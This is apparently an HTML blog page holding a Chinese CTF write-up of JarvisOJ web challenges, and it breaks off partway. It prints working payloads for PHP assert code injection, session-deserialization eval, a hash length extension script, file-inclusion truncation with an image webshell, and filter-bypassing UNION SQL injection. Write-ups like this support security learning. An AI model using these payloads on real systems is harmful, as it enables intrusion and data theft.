@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>jarvisoj web部分writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,web,ctf,jarvisoj">
+  
+
+  
+    <meta name="description" content="本篇博客介绍了jarvisOJ上web部分题writeup！！！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">jarvisoj web部分writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/10/05/jarvisoj-web-wp/">
+      jarvisoj web部分writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年10月5日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客介绍了jarvisOJ上web部分题writeup！！！</p>
+<a id="more"></a>
+
+<h2 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h2><p>打开题目发现提示git搭建的，有没有源码泄露？</p>
+<p>githack跑下，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从泄露里可以看到有<code>flag.php</code>，猜测flag在里面</p>
+<p>从源码里可以看到可以代码执行</p>
+<p><strong>payload:</strong></p>
+<pre><code>?page=&#39;^system(&#39;cat templates/flag.php&#39;)^&#39;</code></pre>
+<p>得到flag</p>
+<h2 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h2><p>打开题目网址：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805174242.png"></p>
+<p>dirsearch一扫</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805174301.png"></p>
+<p>访问robots.txt</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805174319.png"></p>
+<p>访问提示的内容</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805174340.png"></p>
+<p>flag出来了？那么简单？就是那么简单</p>
+<h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>打开题目网址：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805144450.png"></p>
+<p>仅本机访问，立刻想到抓包改XFF</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805144941.png"></p>
+<p>flag就这样出来了，是不是很简单？就是这样简单</p>
+<pre><code>PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; </code></pre>
+<h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>打开提示<code>Only Admin can see the flag!!</code></p>
+<p>抓包看下，很明显问题的入手点在Cookie这里</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191213221259.png"></p>
+<p>url解码发现是</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p>
+<p>改下guest重新发包发现没反应，应该和hsh有关系</p>
+<p>没什么思路，就扫下路径吧，dirsearch扫到备份文件<code>index.php~</code>，但打开发现不能看到源码</p>
+<p>猜测是vi异常退出的文件，第一次异常退出会产生一个<code>*.swp</code>，再次意外退出后，将会产生名为<code>*.swo</code>的交换文件；而第三次产生的交换文件则为<code>*.swn</code>的文件，依此类推。</p>
+<p>可以直接用<code>vim -r</code>恢复文件</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191213221518.png"></p>
+<p>恢复出来的关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$auth = <span class="literal">false</span>;</span><br><span class="line">$role = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">$salt = </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line">	$role = unserialize($_COOKIE[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line">	$hsh = $_COOKIE[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> ($role===<span class="string">&quot;admin&quot;</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line">		$auth = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$auth = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$s = serialize($role);</span><br><span class="line">	setcookie(<span class="string">&#x27;role&#x27;</span>,$s);</span><br><span class="line">	$hsh = md5($salt.strrev($s));</span><br><span class="line">	setcookie(<span class="string">&#x27;hsh&#x27;</span>,$hsh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">	echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码的意思就是反序列化Cookie里的role，将salt(未知)和反转后的role拼接一起并MD5加密，然后与Cookie里的hash比较，相等就会输出flag</p>
+<p>这就要用到hash扩展攻击的知识参见我的另外一篇博客：<a target="_blank" rel="noopener" href="https://www.moonback.xyz/2019/12/16/hash-extend-attack/">https://www.moonback.xyz/2019/12/16/hash-extend-attack/</a></p>
+<p>由于我们不知道$salt的长度，所以我们需要对其长度爆破，爆破之前，我们需要知道的是反序列化函数存在00截断，为保证<code>$role===&quot;admin&quot;</code>，我们必须<code>s:5:&quot;guest&quot;;</code>在前面，注意服务端在md5加密的是反转的role的键值。所以我们构造的payload应该为以下内容，最终知道salt的长度为12(0c)</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/0191230142702.png"></p>
+<p>这里有个脚本，需要装个hashpumpy库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;guest&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;s:5:&quot;admin&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">	m=hashpumpy.hashpump(hsh,s1[::<span class="number">-1</span>],s2[::<span class="number">-1</span>],i)</span><br><span class="line">    <span class="comment"># 四个参数分别为 hash值 secret后的字符串 更改后secret后的字符串 secret的长度 </span></span><br><span class="line">	<span class="keyword">print</span> i</span><br><span class="line">	Cookie=<span class="string">&quot;role=&quot;</span>+urllib.quote(urllib.unquote(m[<span class="number">1</span>])[::<span class="number">-1</span>])+<span class="string">&quot;; hsh=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line">	headers=&#123;<span class="string">&quot;Cookie&quot;</span>:Cookie&#125;</span><br><span class="line">	r=requests.get(url,headers=headers)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;Welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> r.text;</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>拿到题是这样的</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105200834.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;index.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>既然题目告诉我们phpinfo,我们就尝试访问一下,发现果然存在</p>
+<p>从phpinfo能看出来好多东西，这里就不绕弯子了</p>
+<p>本题考察的就是session反序列化的知识</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105201933.png"></p>
+<p><code>session.save_path</code>是指session的存储路径，如果是<code>no value</code>，那么将会是默认路径<code>/tmp/sess_**</code></p>
+<p><code>session.serialize_handler</code>是指session的序列化引擎。<code>Master Value</code>是PHP.ini文件中的内容，<code>Local value</code> 是当前目录中的设置，这个值会覆盖<code>Master Value</code>中对应的值</p>
+<p><code>session.upload_progress.cleanup</code>这个是指session上传进度是否自动清除的选项</p>
+<p>可以看下<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">手册</a></p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105203115.png"></p>
+<p>大概意思就是，如果session上传进度开启的话，可以POST一个<code>PHP_SESSION_UPLOAD_PROGRESS</code>变量，上传进度会保存在<code>$_SESSION</code>中，然后通过php序列化引擎的不同来导致漏洞（session的写入会序列化，session的读取会反序列化）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;恶意代码&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new OowoO();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>序列化的结果</p>
+<pre><code>O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:16:&quot;恶意代码&quot;;&#125;    //长度修改下</code></pre>
+<p>这里我们用下面这个网页构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包可以看到</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105230429.png"></p>
+<p>从phpinfo可以看到网站路径是<code>/opt/lampp/htdocs</code>，然后在<code>filename</code>插入反序列化的内容</p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></pre>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105230751.png"></p>
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></pre>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191105230850.png"></p>
+<h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><p>这题就是一个简单的xxe</p>
+<p>抓包将<code>Content-Type</code>改成<code>application/xml</code>，POST区添加而已xml就行</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191216161236.png"></p>
+<h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>打开题目，发现有三个页面</p>
+<p>切换一下发现有page这个参数，瞬间想到了文件包含</p>
+<p>试试index.php</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191216155606.png"></p>
+<p>发现是fopen函数，想到了%00截断，试试吧</p>
+<p>构造类似的payload：</p>
+<pre><code>index.php?page=uploads/1576482315.gif%00</code></pre>
+<p>上传一个gif/jpg图片马，发现</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191216160332.png"></p>
+<p>对<code>&lt;?php</code>或<code>?&gt;</code>做了过滤?</p>
+<p>试试<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>吧</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191216160559.png"></p>
+<p>得到flag，感觉View功能都没用上2333…..</p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>打开题目网址：</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805154705.png"></p>
+<p>看到id=1，第一时间想到注入，很可惜不是注入</p>
+<p>查看源代码看到有个提示，访问一下</p>
+<p>得到一大串代码，排版一下</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805155051.png"></p>
+<p>传入三个参数，id,a,b</p>
+<p>id值等于0但自身不能为0,可以弱类型比较</p>
+<p>a涉及file_get_contents，需用伪协议<code>php://input</code>传入”<code>1112 is a nice lab!</code>”</p>
+<p>b长度大于5且可能涉及eregi绕过，可以用%00截断</p>
+<pre><code>payload1:?id=0.&amp;a=php://input&amp;b=%000x34aa  并post个1112 is a nice lab!
+payload2:?id=0e&amp;a=data:,1112 is a nice lab!&amp;b=%00411111</code></pre>
+<p>关于payload2中data:后为什么有逗号，具体参见：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87479691">https://blog.csdn.net/qq1045553189/article/details/87479691</a></p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805161344.png"></p>
+<p>本以为得到了flag,提交发现错误，再看看500大分的题，应该不会那么简单，<br>再战</p>
+<p>也不绕弯子了，直接访问我们我们得到的信息，果然有这个网页，不要问我为什么&gt;_&lt;</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805161938.png"></p>
+<p>又看到id=1了，再次想到注入，这次对了，加个/,发现</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805162126.png"></p>
+<p>尝试id=2-1,发现返回还是id=1的结果，说明代入执行了，存在注入<br>回显为如果检测到注入就返回you bad boy/girl!，如果执行了查询不到结果就返回执行语句</p>
+<p>order by 判断列数，发现被过滤了，</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805163827.png"></p>
+<p>将空格替换成/**/发现也被过滤了，将空格替换为/<em>1</em>/，返回hi666</p>
+<p>当为4时报错，只有三列，联合查询判断回显位，发现发现union,select,from都被替换为空了，双写即可绕过</p>
+<pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,database(),3%23</code></pre>
+<p>执行发现回显3，说明第三个位置为回显位</p>
+<pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,database()%23</code></pre>
+<p>爆出数据库test</p>
+<pre><code>?        id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()%23</code></pre>
+<p>爆出表为content</p>
+<pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_schema=database()#</code></pre>
+<p>爆出字段id,context,title</p>
+<pre><code>?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(id,0x23,context,0x23,title)/*1*/frfromom/*1*/test.content#</code></pre>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20190805173153.png"></p>
+<pre><code>PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</code></pre>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>打开题目，发现是一张图片，Ctrl+U查看源码发现</p>
+<p><img src="/2019/10/05/jarvisoj-web-wp/20191210222517.png"></p>
+<p>猜测img传的东西是base64加密的，解密以下发现是<code>shield.jpg</code>，换成其他<code>/etc/passwd</code>发现不行，尝试包含<code>index.php</code>,<code>showimg.php</code>,<code>shield.php</code></p>
+<p><strong>index.php:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; $g = $_GET[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>showing.php:</strong></p>
